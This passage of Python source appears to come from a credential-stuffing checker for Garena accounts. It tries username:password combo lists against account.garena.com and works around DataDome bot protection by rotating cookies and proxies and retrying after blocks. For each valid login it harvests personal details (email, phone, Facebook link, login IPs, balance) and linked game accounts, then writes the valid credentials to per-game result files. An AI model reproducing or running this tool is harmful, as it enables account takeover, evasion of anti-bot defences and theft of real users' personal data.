        table.add_row("Login From", f"[dim]{last_login_where}[/dim]")
        table.add_row("Login IP", f"[dim]{last_login_ip}[/dim]")
        table.add_row("Country", f"[dim]{last_login_country}[/dim]")
        
        if other_games:
            table.add_row("", "")
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                table.add_row(f"{gname} [{greg}]" if greg else gname, f"[magenta]{grole}[/magenta]")
        
        table.add_row("", "")
        table.add_row("Status", f"[bold {border_color}]{'Clean' if is_clean else 'Not Clean'}[/bold {border_color}]")
        
        console.print(Panel(table, title=title, border_style=border_color, box=HEAVY, padding=(0, 1)))

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections)

_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

_DONE_LEDGER = Path('Results/_done_ledger.txt')
_ledger_lock = threading.Lock()
_RETRY_FILE = Path('Results/_retry_queue.txt')
_retry_lock = threading.Lock()

def _mark_done(account_line):
    _DONE_LEDGER.parent.mkdir(exist_ok=True)
    with _ledger_lock:
        with open(_DONE_LEDGER, 'a', encoding='utf-8') as f:
            f.write(account_line + '\n')

def _enqueue_retry(account_line, reason):
    _RETRY_FILE.parent.mkdir(exist_ok=True)
    with _retry_lock:
        with open(_RETRY_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{account_line}\t{reason}\n")

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS', 
               '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV', 
               '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE',
               '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS',
               '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE',
                    '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS',
                    '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
                        'Pragma': 'no-cache', 'Accept': '*/*', 
                        'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=(3, 5))
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
                       'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, 
                                       json={'token': access_token}, timeout=(3, 5))
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
                         'Accept': 'application/json, text/plain, */*', 
                         'Referer': f'https://{base_domain}/?app={app_id}', 
                         'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id}, 
                                        headers=roles_hdrs, timeout=(3, 5))
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({
                    'region': region.upper(), 
                    'game': game_name, 
                    'role': str(role),
                    'app_id': app_id
                })
    except Exception as e:
        logger.error(f'[ERROR] get_game_connections failed: {e}')
    return game_info

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        logger.error(f'[ERROR] save_game_folder: {e}')



# ══════════════════════════════════════════════════════════════════════════
#  ADAPTIVE RETRY — Exponential backoff with jitter
# ══════════════════════════════════════════════════════════════════════════
_RETRY_STATS = {'total_retries': 0, 'total_success': 0, 'total_fail': 0}
_RETRY_LOCK = threading.Lock()


def _adaptive_backoff(attempt, base=0.3, cap=3.0, jitter=0.5):
    """Exponential backoff with jitter — prevents thundering herd."""
    delay = min(cap, base * (2 ** attempt))
    return delay + random.uniform(0, jitter)


def _classify_error(error_msg):
    """Classify error to decide retry strategy.
    Returns: (should_retry, cooldown_seconds)
    """
    if not error_msg:
        return (True, 0)
    e = str(error_msg).lower()

    # Retryable (transient)
    if any(x in e for x in ['timeout', 'connection', 'network', 'proxy', 'rate', '503', '502', '504']):
        return (True, 0)

    # Cooldown required
    if any(x in e for x in ['ip block', 'banned', '429', 'too many']):
        return (True, 30)

    # Permanent fail
    if any(x in e for x in ['incorrect password', "doesn't exist", 'error_auth', 'invalid']):
        return (False, 0)

    # Unknown — retry once
    return (True, 0)


def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
    max_retries = 12  # balanced speed vs accuracy
    attempt = 0
    _fast_fail_count = 0  # track consecutive fast-fails
    
    # Exponential backoff to prevent "death by a thousand sleeps"
    def _backoff(attempt, base=0.2, cap=2.0, jitter=0.3):
        delay = min(cap, base * (2 ** attempt))
        return delay + random.uniform(0, jitter)
    
    def _display(acc, pwd, det, codm, has, err=None, gc=None):
        if not suppress_print:
            (display_codm_info_elegant if use_elegant_display else display_codm_info)(acc, pwd, det, codm, has, err, gc)
    
    while True:
        attempt += 1
        try:
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)
            
            dd = datadome_manager.get_datadome()
            if dd:
                datadome_manager.set_session_datadome(session, dd)
            else:
                saved = cookie_manager.get_random_cookie()
                if saved:
                    val = saved.split('=', 1)[1] if '=' in saved else saved
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    ndd = get_datadome_cookie(session, proxies=proxy_dict)
                    if ndd:
                        datadome_manager.set_datadome(ndd)
                        datadome_manager.set_session_datadome(session, ndd)
            
            v1, v2, new_dd = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
            
            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = _fast_session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return 'IP_CHANGED', {}
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'IP Change Timeout'}
            
            if v1 == 'NETWORK_ERROR':
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {_YL}⚠  Network/Proxy error, retrying ({attempt}/{max_retries}){_RST}')
                    time.sleep(_backoff(attempt))
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network/Proxy Error'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'Network/Proxy Error'}
            
            if not v1 or not v2:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                _display(account, password, None, None, False, err="Account Doesn't Exist!")
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': "Account Doesn't Exist"}
            
            if new_dd:
                datadome_manager.set_datadome(new_dd)
                datadome_manager.set_session_datadome(session, new_dd)
            
            sso_key = login(session, account, password, v1, v2)
            
            if sso_key in ('rate_limited', 'network_error'):
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {_YL}⚠  Rate limited/Network error, retrying ({attempt}/{max_retries}){_RST}')
                    time.sleep(_backoff(attempt))
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Rate Limited / Network Error'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'Rate Limited / Network Error'}
            
            if not sso_key:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Unknown Login Error'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'Unknown Login Error'}
            
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err=reason)
                if auto_remove and file_manager:
                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                return 'ERROR', {'error_reason': reason}
            
            cookie_parts = [f'{k}={session.cookies.get(k)}' for k in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'] if session.cookies.get(k)]
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            
            # Aggressive fail-fast timeouts (connect, read)
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=(3, 6))
            
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                # Mark proxy as failed
                current_proxy = session.proxies.get('http') if session.proxies else None
                if proxy_manager and current_proxy:
                    proxy_manager.mark_fail(current_proxy)
                if datadome_manager.handle_403(session):
                    if proxy_manager and proxy_manager.is_loaded():
                        next_proxy = proxy_manager.get_next()
                        if next_proxy:
                            session.proxies.clear()
                            session.proxies.update(next_proxy)
                        datadome_manager._403_attempts = 0
                    if attempt < max_retries:
                        if not suppress_print:
                            print(f'  {_YL}⚠  403 error, retrying ({attempt}/{max_retries}){_RST}')
                        time.sleep(_adaptive_backoff(attempt))
                        continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'Cookie Banned/IP Blocked'}
            
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {_YL}⚠  Invalid response, retrying ({attempt}/{max_retries}){_RST}')
                    time.sleep(_backoff(attempt))
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'Invalid Server Response'}
            
            if 'error_auth' in account_data_json:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove and file_manager:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR', {'error_reason': 'Incorrect Password'}
            
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    live_stats.update_stats(valid=False)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err="Account Doesn't Exist!")
                    if auto_remove and file_manager:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR', {'error_reason': "Account Doesn't Exist"}
                else:
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    live_stats.update_stats(is_error=True)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err=error_msg)
                    if auto_remove and file_manager:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR', {'error_reason': error_msg}
            
            # Mark proxy as successful
            if proxy_manager and session.proxies:
                _cp = session.proxies.get('http')
                if _cp:
                    proxy_manager.mark_success(_cp)

            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            
            codm_session = _fast_session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
            
            has_codm, codm_info = check_codm_account(codm_session, account)
            codm_session.close()
            
            game_connections = []
            if CHECK_OTHER_GAMES:
                # SKIP extra calls — save time. Only fetch if CODM found.
                if has_codm:
                    try:
                        if not suppress_print:
                            console.print(f'  [dim]🔄 Checking other games for {account}...[/dim]')
                        game_connections = get_game_connections(session, account)
                    except Exception as _ge:
                        if not suppress_print:
                            console.print(f'  [yellow]⚠ Game check error: {_ge}[/yellow]')
            
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
            else:
                email_display = 'N/A'
            
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
            
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            
            shell_balance = details['profile'].get('shell_balance', 0)
            
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': shell_balance,
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'game_connections': game_connections
            }
            
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            
            results_manager.add_account(account_data)
            
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(
                valid=True,
                clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                game_connections=game_connections,
                shell=shell_balance
            )
            live_stats.push_result(
                success=True,
                is_clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                shell_balance=shell_balance
            )
            
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            
            _display(account, password, details, codm_info, has_codm, gc=game_connections)
            
            if auto_remove and file_manager:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
            
            return 'DONE', {
                'success': True, 
                'is_clean': details['is_clean'], 
                'has_codm': has_codm, 
                'codm_level': codm_level, 
                'shell_balance': shell_balance, 
                'error_reason': ''
            }
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < max_retries:
                if not suppress_print:
                    print(f'  {_YL}⚠  Connection/Timeout error, retrying ({attempt}/{max_retries}){_RST}')
                time.sleep(_backoff(attempt))
                continue
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove and file_manager:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR', {'error_reason': 'Connection/Timeout Error'}
            
        except Exception as e:
            if attempt < max_retries:
                time.sleep(_backoff(attempt))
                continue
            logger.error(f'[ERROR] Unexpected error processing {account}')
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove and file_manager:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR', {'error_reason': f'Unexpected Error: {str(e)}'}
        
def prompt_proxy_setup():
    global proxy_manager
    indent = "    "
    clear_screen()
    display_banner()

    def _header(title, subtitle=None):
        console.print(Panel(
            Text(title, style="bold bright_white") if not subtitle
            else Text(title, style="bold bright_white") + Text(f"\n{subtitle}", style="dim"),
            border_style="bright_magenta", box=box.ROUNDED, expand=False
        ))
        print()

    def _panel(content, border="bright_cyan"):
        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
        print()

    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
    def _info(msg): console.print(indent + f"  [bold bright_cyan]{msg}[/bold bright_cyan]")
    def _ask(prompt, color="bold bright_cyan"):
        return console.input(indent + f"[{color}]  ❯ {prompt}[/{color}]").strip()

    _header("PROXY CONFIGURATION", "Configure how requests are routed")

    mode_text = (
        Text("  [1]  ", style="bold bright_cyan") + Text("Custom URL", style="bold white") +
        Text("   – Single proxy, enter manually\n", style="dim") +
        Text("  [2]  ", style="bold bright_cyan") + Text("Proxy File", style="bold white") +
        Text("   – Load multiple proxies from a file\n", style="dim") +
        Text("  [3]  ", style="bold bright_cyan") + Text("No Proxy  ", style="bold white") +
        Text("   – Direct connection, no routing", style="dim")
    )
    _panel(mode_text)

    while True:
        choice = _ask("Select mode (1-3, default 2): ") or "2"
        if choice in ("1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"):
            break
        _err("Invalid choice. Enter 1-7.")
    print()

    if choice == "1":
        fmt_text = (
            Text("Enter a proxy URL in any format.\n\n", style="bold bright_white") +
            Text("  Supported protocols:\n", style="dim") +
            Text("  HTTP    ", style="bold cyan") + Text("– standard proxy, most compatible\n", style="dim") +
            Text("  HTTPS   ", style="bold cyan") + Text("– encrypted tunnel to proxy server\n", style="dim") +
            Text("  SOCKS5  ", style="bold cyan") + Text("– lower level, faster, supports UDP\n", style="dim") +
            Text("  SOCKS4  ", style="bold cyan") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
            Text("  Accepted formats:\n", style="dim") +
            Text("  http://user:pass@host:port      ", style="cyan") + Text("← standard URL\n", style="dim") +
            Text("  socks5://user:pass@host:port    ", style="cyan") + Text("← SOCKS5 with auth\n", style="dim") +
            Text("  host:port:user:pass             ", style="cyan") + Text("← colon-separated\n", style="dim") +
            Text("  user:pass@host:port             ", style="cyan") + Text("← auth prefix\n", style="dim") +
            Text("  host:port                       ", style="cyan") + Text("← no auth\n\n", style="dim") +
            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="cyan") +
            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="cyan") +
            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.", style="cyan")
        )
        _panel(fmt_text)

        url_input = _ask("Proxy URL (Enter to skip): ")
        print()

        if not url_input:
            proxy_manager = ProxyManager(enabled=False)
            _warn("No URL entered. Proxies disabled.")
        else:
            normalised = _parse_proxy_line(url_input)
            if not normalised:
                _err("Could not parse that format. Proxies disabled.")
                proxy_manager = ProxyManager(enabled=False)
            else:
                val_text = (
                    Text("Test this proxy before using it?\n\n", style="bold bright_white") +
                    Text("  [Y]  ", style="bold green") + Text("Yes – verify connectivity and IP\n", style="dim") +
                    Text("  [N]  ", style="bold yellow") + Text("No  – use as-is", style="dim")
                )
                _panel(val_text)
                do_validate = _ask("Validate? (y/N): ").lower() or 'n'

                if do_validate in ("y", "yes"):
                    print()
                    _info("🔍 Testing proxy…")
                    ok, info, lat = _validate_proxy(normalised)
                    _close_check_session()
                    print()
                    if ok:
                        _ok(f"Proxy live.  IP: [cyan]{info}[/cyan]")
                        _display_proxy_quality(1, 1, lat, indent)
                        proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                    else:
                        _err(f"Validation failed: [yellow]{info}[/yellow]")
                        hint_map = {
                            "auth_failed(407)":   "407 – Credentials rejected. Check username and password.",
                            "auth_denied(403)":   "403 – Account suspended or IP not whitelisted.",
                            "auth_denied(401)":   "401 – Invalid credentials.",
                            "dns_fail":           "Cannot resolve hostname. Check the host in the URL.",
                            "connection_refused": "Connection refused. Wrong port or server is down.",
                            "connect_timeout":    "Timed out. Proxy may be overloaded or host is wrong.",
                        }
                        hint = next((v for k, v in hint_map.items() if info.startswith(k)),
                                    "Proxy unreachable or blocked the check endpoint.")
                        console.print(indent + f"  [dim]↳ {hint}[/dim]")
                        print()

                        force_text = (
                            Text("Proxy failed validation.\n\n", style="bold yellow") +
                            Text("  [Y]  ", style="bold yellow") + Text("Use it anyway\n", style="dim") +
                            Text("  [N]  ", style="bold red") + Text("Disable proxies", style="dim")
                        )
                        _panel(force_text, border="yellow")
                        force = _ask("Use anyway? (y/N): ", color="bold yellow").lower()

                        if force in ("y", "yes"):
                            proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                            _warn("Proxy set (unvalidated).")
                        else:
                            proxy_manager = ProxyManager(enabled=False)
                            _warn("Proxies disabled.")
                else:
                    proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                    _ok("Custom proxy set (validation skipped).")

    elif choice == "2":
        file_input = _ask("File path (Enter for proxies.txt): ") or "proxies.txt"
        print()

        if not Path(file_input).is_file():
            _err(f"File not found: '{file_input}'. Proxies disabled.")
            proxy_manager = ProxyManager(enabled=False)
        else:
            raw_lines = Path(file_input).read_text(encoding="utf-8", errors="ignore").splitlines()
            parsed_urls, skipped = [], 0
            for line in raw_lines:
                url = _parse_proxy_line(line)
                if url:
                    parsed_urls.append(url)
                elif line.strip() and not line.strip().startswith("#"):
                    skipped += 1

            console.print(
                indent +
                f"  [bold bright_cyan]Loaded:[/bold bright_cyan]  "
                f"[green]{len(parsed_urls)} proxies[/green]  "
                f"[dim]│[/dim]  "
                f"[yellow]{skipped} lines skipped[/yellow]"
            )
            print()

            if not parsed_urls:
                _warn("No valid proxies found. Proxies disabled.")
                proxy_manager = ProxyManager(enabled=False)
            else:
                val_text = (
                    Text("Validate all proxies?\n\n", style="bold bright_white") +
                    Text("  [Y]  ", style="bold green") + Text("Yes – test each, keep only working ones\n", style="dim") +
                    Text("  [N]  ", style="bold yellow") + Text("No  – use all as-is", style="dim")
                )
                _panel(val_text)
                do_validate = _ask("Validate? (y/N): ").lower() or 'n'

                if do_validate in ("y", "yes"):
                    print()
                    speed_text = (
                        Text("Select validation speed.\n\n", style="bold bright_white") +
                        Text("  [1]  ", style="bold bright_cyan") + Text("Turbo   ", style="bold white") + Text("1000 threads, 4s timeout  – fastest, high RAM\n", style="dim") +
                        Text("  [2]  ", style="bold bright_cyan") + Text("Fast    ", style="bold white") + Text(" 500 threads, 5s timeout  – recommended\n", style="dim") +
                        Text("  [3]  ", style="bold bright_cyan") + Text("Normal  ", style="bold white") + Text(" 200 threads, 7s timeout  – stable\n", style="dim") +
                        Text("  [4]  ", style="bold bright_cyan") + Text("Slow    ", style="bold white") + Text(" 50 threads, 10s timeout – low-end PC", style="dim")
                    )
                    _panel(speed_text)
                    speed_choice = _ask("Speed (1-4, Enter = Fast): ")
                    workers, timeout = {"1": (1000, 4.0), "2": (500, 5.0), "3": (200, 7.0), "4": (50, 10.0)}.get(speed_choice, (500, 5.0))
                    print()

                    console.print(
                        indent +
                        f"  [bold bright_cyan]Validating:[/bold bright_cyan]  "
                        f"[yellow]{len(parsed_urls):,} proxies[/yellow]  "
                        f"[dim]│[/dim]  [cyan]{workers} threads[/cyan]  "
                        f"[dim]│  {timeout}s timeout[/dim]"
                    )
                    print()

